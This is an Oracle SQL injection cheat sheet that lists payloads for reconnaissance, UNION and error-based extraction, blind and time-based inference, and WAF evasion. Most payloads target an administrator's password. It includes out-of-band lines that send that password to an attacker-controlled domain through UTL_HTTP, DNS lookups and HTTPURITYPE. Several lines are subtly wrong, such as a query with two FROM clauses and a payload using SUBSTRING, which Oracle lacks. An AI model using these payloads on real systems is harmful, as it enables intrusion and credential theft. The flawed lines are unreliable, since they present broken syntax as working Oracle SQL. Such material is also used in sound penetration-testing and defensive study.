# Oracle — SQL Injection Exploitation Cheat Sheet
 
## 1. Fingerprinting & Environment Recon

```sql
-- Version & banner
SELECT banner FROM v$version;
SELECT * FROM v$instance;

-- Current user / schema context
SELECT user FROM dual;
SELECT SYS_CONTEXT('USERENV', 'CURRENT_SCHEMA') FROM dual;
SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM dual;

-- Privilege assessment
SELECT * FROM session_privs;
SELECT * FROM session_roles;
```

## 2. Syntax & Comment Dialects SQL

```sql
-- Inline comment
' AND 1=1--

-- Multi-line comment
' AND /*comment*/ 1=1

-- String concatenation (double pipe operator)
SELECT username || ':' || password FROM users FROM dual;
SELECT CONCAT(username, password) FROM users FROM dual;
```
**MANDATORY DUMMY TABLE**: Every **SELECT** in Oracle must target a table; use the built-in **dual** table:
```sql
SELECT 'abc' FROM dual;
```

## 3. Schema & Metadata Enumeration

```sql
-- List tables accessible to current user
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;

-- List columns of a specific table (Note: Unquoted names are stored in UPPERCASE)
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';

-- Row-folding: aggregate rows into a single string (Oracle 11gR2+)
SELECT LISTAGG(username || ':' || password, ',') WITHIN GROUP (ORDER BY username) FROM users;
```

## 4. In-Band Exploitation (UNION & Error-Based)

```sql
-- NULL probing for column count
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, NULL FROM dual--

-- Strict type matching required; align data types precisely
' UNION SELECT NULL, CAST(username AS VARCHAR2(100)) FROM users--

-- Verbose error-based extraction via XMLType/EXTRACTVALUE injection
' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><root>' || (SELECT password FROM users WHERE username='administrator') || '</root>'), '/root')--

-- Conditional induced error (Division by zero via TO_CHAR)
' AND (CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END) = 'a'--
' AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END) = 'a'--
```

## 5. Blind & Inferential Payloads 

```sql
-- Boolean-based extraction
' AND 1=1--
' AND 1=2--
' AND SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a'--
' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)) > 100--

-- Conditional logic (CASE WHEN is mandatory; inline IF does not exist in Oracle SQL)
' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1--

-- Time-based delays (No native sleep function; via DBMS_PIPE)
' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) = 1--

-- Heavy query Cartesian product alternative for time delays
' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) > 0--
```

## 6. Stacked Queries & Out-of-Band (OAST)

```
Stacked query support: NOT SUPPORTED. Standard Oracle drivers (OCI/JDBC) reject semicolon-separated stacked statements (ORA-00911).
```
```sql
-- Out-of-band (OAST) exfiltration via UTL_HTTP
' AND UTL_HTTP.REQUEST('http://attacker-controlled-domain/' || (SELECT password FROM users WHERE username='administrator')) IS NOT NULL--

-- DNS lookup exfiltration via UTL_INADDR
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator') || '.attacker-controlled-domain') IS NOT NULL--

-- OOB via HTTPURITYPE
' AND HTTPURITYPE('http://attacker-controlled-domain/' || (SELECT password FROM users WHERE username='administrator')).GETCLOB() IS NOT NULL--
```

## 7. WAF Evasion & DBMS-Specific Quirks

```sql
-- Whitespace alternatives
' UNION%0aSELECT%0a1, 2 FROM dual--
' UNION%09SELECT%091, 2 FROM dual--
' UNION(SELECT(1),(2)FROM(dual))--

-- Quote-free string construction via CHR() concatenation
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) FROM dual;  -- builds 'admin'
' AND username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
```
